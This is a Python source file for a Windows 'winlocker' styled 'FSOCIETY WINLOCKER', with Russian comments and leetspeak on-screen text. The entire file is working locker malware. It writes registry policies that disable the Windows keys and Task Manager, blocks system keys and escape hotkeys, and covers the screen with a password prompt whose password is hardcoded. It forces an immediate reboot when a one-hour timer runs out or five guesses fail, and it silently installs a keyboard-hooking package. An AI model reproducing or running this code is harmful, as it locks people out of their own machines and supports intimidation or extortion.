import sys, os
sys.stderr = open(os.path.join(os.environ['TEMP'], 'wl_error.txt'), 'w')
sys.stdout = sys.stderr

# ДАЛЬШЕ ВЕСЬ КОД ВИНЛОКЕРА (скопируй из check.py)
import os as _os, sys as _sys, time, threading, ctypes, winreg, shutil, subprocess, tkinter as tk
try: import keyboard
except: subprocess.check_call([_sys.executable,"-m","pip","install","keyboard"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW); import keyboard

PASS = "1601"
TRIES = 5
HOURS = 1
TIMER = _os.path.join(_os.environ['PROGRAMDATA'], "Microsoft", "timer.dat")
tries = TRIES

def hide(): pass  # Временно не скрываем

def lock():
    for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        for k,n in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
            try:
                r = winreg.OpenKey(h, k, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(r, n, 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(r)
            except: pass
    for k in ['alt','ctrl','shift','tab','caps lock','esc','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','delete','windows','left windows','right windows']:
        try: keyboard.block_key(k)
        except: pass
    for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v','win+d','win+r','win+e','win+l','win+m','win+x','win+tab']:
        try: keyboard.add_hotkey(c, lambda:0, suppress=True)
        except: pass

def unlock():
    try: keyboard.unhook_all()
    except: pass
    for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        for k,n in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
            try:
                r = winreg.OpenKey(h, k, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(r, n, 0, winreg.REG_DWORD, 0)
                winreg.CloseKey(r)
            except: pass

def timer_save():
    end = time.time() + HOURS * 3600
    _os.makedirs(_os.path.dirname(TIMER), exist_ok=True)
    with open(TIMER, 'w') as f: f.write(str(end))
    return end

def timer_get():
    try:
        with open(TIMER) as f: return float(f.read())
    except: return timer_save()

def destroy():
    _os.system("shutdown /r /t 0 /f")
    _os._exit(0)

class Locker:
    def __init__(self):
        global tries
        self.r = tk.Tk(); self.r.withdraw()
        self.w = tk.Toplevel(self.r)
        self.w.attributes('-fullscreen', True); self.w.attributes('-topmost', True)
        self.w.configure(bg='black'); self.w.overrideredirect(True)
        self.w.protocol("WM_DELETE_WINDOW", lambda:None)
        self.w.bind("<Alt-F4>", lambda e:None)
        self.w.bind("<Escape>", lambda e:None)
        self.w.focus_force()
        
        self.end = timer_get()
        self.tl = tk.Label(self.w, text="", bg='black', fg='#ff4444', font=('Courier', 30, 'bold'))
        self.tl.place(relx=0.5, rely=0.08, anchor='center')
        self.tick()
        
        msg = f"FSOCIETY WINLOCKER\n\nPOPYT0K: {TRIES}\nTAMEP: {HOURS} 4AC"
        tk.Label(self.w, text=msg, bg='black', fg='white', font=('Courier', 12, 'bold'), justify='center').place(relx=0.5, rely=0.4, anchor='center')
        
        cf = tk.Frame(self.w, bg='black')
        cf.place(relx=0.5, rely=0.65, anchor='center')
        tk.Label(cf, text="BBE~N PAR0L:", bg='black', fg='white', font=('Courier', 14, 'bold')).pack(pady=(0,5))
        self.e = tk.Entry(cf, show="*", font=('Courier', 14, 'bold'), bg='white', fg='black', relief='solid', bd=2)
        self.e.pack(pady=(0,5), ipadx=40, ipady=3)
        self.sl = tk.Label(cf, text=f"0CTALOCb: {tries}", bg='black', fg='white', font=('Courier', 12, 'bold'))
        self.sl.pack()
        self.e.bind('<Return>', self.chk)
        self.e.focus_force()
        self.w.after(100, self.focus)
    
    def tick(self):
        r = self.end - time.time()
        if r <= 0: destroy()
        h, m, s = int(r//3600), int((r%3600)//60), int(r%60)
        self.tl.config(text=f"{h:02d}:{m:02d}:{s:02d}")
        self.w.after(1000, self.tick)
    
    def focus(self):
        try: self.w.focus_force(); self.e.focus_force(); self.w.after(100, self.focus)
        except: pass
    
    def chk(self, e=None):
        global tries
        if self.e.get() == PASS:
            unlock()
            self.sl.config(text="BEPHO!", fg='white')
            self.w.update()
            try: _os.remove(TIMER)
            except: pass
            time.sleep(1)
            self.r.destroy()
            _os._exit(0)
        else:
            tries -= 1
            if tries > 0:
                self.sl.config(text=f"HEBEPHO! 0CTALOCb: {tries}", fg='white')
            else:
                self.sl.config(text="404 | 0WU6KA", fg='white')
                self.w.update()
                time.sleep(2)
                destroy()
            self.e.delete(0, tk.END)

if __name__ == "__main__":
    hide()
    threading.Thread(target=lambda: None, daemon=True).start()
    threading.Thread(target=lambda: None, daemon=True).start()
    lock()
    Locker()
    tk.mainloop()
